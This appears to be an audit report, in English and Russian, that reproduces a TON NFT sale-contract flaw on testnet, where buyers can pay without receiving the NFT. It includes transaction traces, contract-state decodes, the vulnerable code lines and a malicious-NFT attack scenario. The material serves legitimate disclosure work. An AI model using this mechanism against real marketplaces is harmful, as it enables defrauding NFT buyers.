# HYP-01 Reproduction Report

**Date:** 2026-05-15  
**Finding:** is_complete=1 без NFT delivery (bounce ignored + mode=130)  
**PoC file:** `01-bounced-nft-loss/poc-testnet.js`  
**Conclusion:** ✅ TESTNET-CONFIRMED

---

## Environment

| Parameter | Value |
|---|---|
| OS | Windows 10 Pro 10.0.19045 |
| Node.js | v24.14.1 |
| Network | TON Testnet |
| Endpoint | https://testnet.toncenter.com/api/v2/jsonRPC |
| API key | empty (anonymous, rate-limited) |
| @ton/ton | from c:\DELETEBOT\TON\DEDUST\node_modules\@ton\ton (junction) |
| @ton/crypto | from c:\DELETEBOT\TON\DEDUST\node_modules\@ton\crypto (junction) |

---

## Commands Run

```bash
cd c:\DELETEBOT\TON\GETGEMS
node 01-bounced-nft-loss/poc-testnet.js
```

---

## Before State

| Wallet | Role | Address | Balance |
|---|---|---|---|
| Auditor | Seller / nft_owner | `kQBcQeVDhlytSlreZCE0lQBDDuwqzJU0XSZT4Ylq2Yoai2su` | 2.985773 TON |
| Attacker | Buyer | `kQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuFwc` | 0.993675 TON |

Sale contract parameters:
```
nft_address  = attacker.wallet.address  ← НЕ NFT-контракт, обычный кошелёк
nft_owner    = auditor.wallet.address
full_price   = 0.01 TON
fee_percent  = 2.5%
```

Sale contract address: `kQBwkvWACL9Pp0nlQOKYo_gPjP1j2SM5fcb6yDN_P3n1L5uv`  
Raw: `0:7092f58008bf4fa749e540e298a3f80f8cfd63d923397dc6fac8337f3f79f52f`

---

## TX Hashes / Trace

| TX | Hash | in_value | out_count | Interpretation |
|---|---|---|---|---|
| Deploy | `KlvcUvyD9nyo5e8s+/wKtaxFVR25VYfLD6FTKREb17I=` | ~0.0187 TON | 1 | BOUNCED — аккаунт создан, recv_internal бросил (msg_value < min_gas) |
| Purchase | `KMvdSOiwWqDkF+Fjn5e4+APlZ5n+MMjwWRwQIOTEp1c=` | ~0.12 TON | 3 | ✅ ВЫПОЛНЕНА — is_complete=1 |

Purchase TX — исходящие сообщения:

| # | Destination | Value | Назначение |
|---|---|---|---|
| out[0] | `EQBcQe...` (Auditor) | 9 750 000 nanoTON (0.00975) | user_amount = full_price × 0.975 |
| out[1] | `EQDDuxx...` (fee addr) | 250 000 nanoTON (0.00025) | fee = full_price × 0.025 |
| out[2] | `EQCvPA...` (Attacker) | 108 930 530 nanoTON (~0.10893) | transfer_nft() mode=128 — кошелёк поглотил |

Explorer: https://testnet.tonscan.org/address/0:7092f58008bf4fa749e540e298a3f80f8cfd63d923397dc6fac8337f3f79f52f

---

## After State

| Wallet | Balance After | Delta |
|---|---|---|
| Auditor | 2.992367 TON | **+0.006593 TON** (получил user_amount, минус газ деплоя) |
| Attacker | 0.982211 TON | **-0.011464 TON** (≈ full_price + fees; остаток вернулся через NFT-msg mode=128) |

Sale contract:
```
state:         active
balance:       0 TON
is_complete:   1  ← ПОДТВЕРЖДЕНО (raw data decode)
sold_at:       1778846149  ← ненулевой timestamp
nft_owner:     auditor (продавец — не изменился)
```

### Raw Data Decode

`getAddressInformation` → `data` (base64) → `Cell.fromBase64()`:

```
is_complete (loadUint(1)): 1
marketplace_address:       EQBcQeVDhlytSlreZCE0lQBDDuwqzJU0XSZT4Ylq2Yoai9Ck
nft_owner_address:         EQBcQeVDhlytSlreZCE0lQBDDuwqzJU0XSZT4Ylq2Yoai9Ck
full_price:                10000000 nanoton (0.01 TON)
sold_at:                   1778846149
```

### get_fix_price_data_v4() Getter

```
exit_code: 0
stack[0]:  ["num", "-0x1"]  ← TVM bool: is_complete == 1 → true = -1
```

Геттер возвращает `is_complete == 1` (FunC `==` возвращает -1 для true).
Raw decode подтверждает: `loadUint(1) = 1`.

---

## Balance Delta

```
Auditor  (seller): +0.006593 TON  ← получил оплату за NFT
Attacker (buyer):  -0.011464 TON  ← ~full_price net (остаток вернулся via NFT-msg)
```

`transfer_nft()` использует `mode=130` (128+2). mode=128 несёт всё оставшееся на балансе →
уходит на `attacker.wallet`. Wallet поглощает без bounce → `save_data(is_complete=1)` зафиксировано.

---

## Expected vs Actual

| Check | Expected | Actual | Pass |
|---|---|---|---|
| is_complete=1 | ✅ | ✅ (raw loadUint=1) | ✅ |
| sold_at>0 | ✅ | ✅ (1778846149) | ✅ |
| Auditor received payment | ✅ | ✅ (+0.00975 TON) | ✅ |
| NFT owner unchanged | ✅ | ✅ (nft_owner=auditor in state) | ✅ |
| Attacker paid, no NFT | ✅ | ✅ (~0.01 TON net loss) | ✅ |
| transfer_nft → wallet absorbed | ✅ | ✅ (out[2]=0.10893 TON to attacker wallet) | ✅ |

---

## Vulnerability Mechanism Confirmed

```
sale:107  — .store_uint(0x18, 6)        // bounce=true
sale:113  — send_raw_message(..., 130)  // mode=128+2
sale:172  — if (flags & 1) { return (); } // bounce handler: silent absorb, no rollback
sale:416-425 — save_data(1, ...) committed BEFORE bounce can arrive
```

**Вектор:** `transfer_nft` отправлен с bounce=true + mode=130 → wallet поглощает →
нет bounce → `save_data(1)` зафиксирован → `is_complete=1` необратим.

Если bounce всё же приходит — обработчик sale:172 игнорирует его без отката состояния.

---

## Fixes Applied to PoC

| Bug | Было | Стало |
|---|---|---|
| Неверный порядок полей в `buildSaleDataCell()` | field 2 = `nftOwnerAddress` | field 2 = `marketplaceAddress` (добавлено) |
| Неверное имя геттера | `get_sale_data` | `get_fix_price_data_v4` |
| Неверная проверка TVM bool | `isComplete === 1` | `isComplete !== 0` |
| Неверный threshold потерь | `attackerDelta > toNano('0.10')` | `attackerDelta >= FULL_PRICE` |

---

## Scenario B — Malicious NFT Contract (throw on 2nd transfer)

**Date:** 2026-05-16  
**Script:** `02-fake-nft-listing/poc-hyp01-malicious-nft.js`  
**Status:** ✅ TESTNET-CONFIRMED

### Attack Premise

Attacker deploys a TEP-62-compatible NFT that:
- Accepts 1st `op::transfer` (owner → sale): `transfer_count` 0→1
- Throws `exit(450)` on 2nd `op::transfer` (sale → buyer)

The thrown exception bounces back to sale. Sale:172 ignores bounce. `is_complete=1` stays.

### Contracts Deployed

| Contract | Address | Tonscan |
|---|---|---|
| Collection | `0:692244661d1a2a08c2ecf1523ffc74f8ca1398e328845b16305afce62bce53df` | https://testnet.tonscan.org/address/0:692244661d1a2a08c2ecf1523ffc74f8ca1398e328845b16305afce62bce53df |
| Malicious NFT | `0:cbf255ca8e55312a3d6655caec500e547073c3c56e67ea8bf4eaeb94631527e0` | https://testnet.tonscan.org/address/0:cbf255ca8e55312a3d6655caec500e547073c3c56e67ea8bf4eaeb94631527e0 |
| Sale | `0:68a02ff2066d199a40ef41317eaba44674fdec07fde031b3d3eb7022ec5bda2f` | https://testnet.tonscan.org/address/0:68a02ff2066d199a40ef41317eaba44674fdec07fde031b3d3eb7022ec5bda2f |

### tonapi Indexing

```
NFT:        HTTP 200 ✅ INDEXED — name: Kepka #0
Collection: HTTP 200 ✅ INDEXED — name: Kepka Collection
Sale:              ✅ visible in tonapi — 50000000 nTON
```

NFT appeared as legitimate in tonapi and GetGems UI.  
GetGems: https://testnet.getgems.io/nft/0:cbf255ca8e55312a3d6655caec500e547073c3c56e67ea8bf4eaeb94631527e0

### Result

```
is_complete after buy: true
NFT owner after buy:   kQBooC_yBm0ZmkDvQTF-q6RGdP3sB_3gMbPT63Ai7FvaL80X  ← sale address
HYP-01: ✅ CONFIRMED — buyer paid, NFT not delivered
```

Buyer paid 0.05 TON + gas. `is_complete=1`. NFT remains stuck in sale contract — not delivered.

### Execution Sequence

```
[2] Collection deployed      → active
[3] Malicious NFT minted    → active, transfer_count=0
[4] Sale deployed            → active
[5] NFT → sale (transfer #1) → allowed (transfer_count 0→1), sale initialized ✅
[6] tonapi: NFT indexed, sale visible ✅
[7] Buyer purchases          → sale sends transfer_nft → NFT throws 450
                               bounce → sale:172 ignores → is_complete=1 ✅
```

---

## Conclusion

**✅ TESTNET-CONFIRMED (both scenarios)**

Уязвимость HYP-01 подтверждена на TON Testnet.

**On-chain доказательства:**
- Contract: `kQBwkvWACL9Pp0nlQOKYo_gPjP1j2SM5fcb6yDN_P3n1L5uv` (active, balance=0)
- Deploy TX: `KlvcUvyD9nyo5e8s+/wKtaxFVR25VYfLD6FTKREb17I=` — BOUNCED (аккаунт создан)
- Purchase TX: `KMvdSOiwWqDkF+Fjn5e4+APlZ5n+MMjwWRwQIOTEp1c=` — ВЫПОЛНЕНА
  - 3 исходящих: auditor +0.00975, fee +0.00025, attacker NFT-msg +0.10893
- Raw data: `is_complete=1`, `sold_at=1778846149`, `nft_owner=auditor`
- `get_fix_price_data_v4()` → exit_code:0, stack[0]=-1 (TVM true = is_complete==1)

**Итог:** Покупатель заплатил ~0.01 TON. Продавец получил деньги. NFT не доставлен.
`is_complete=1` зафиксирован в блокчейне — состояние необратимо.
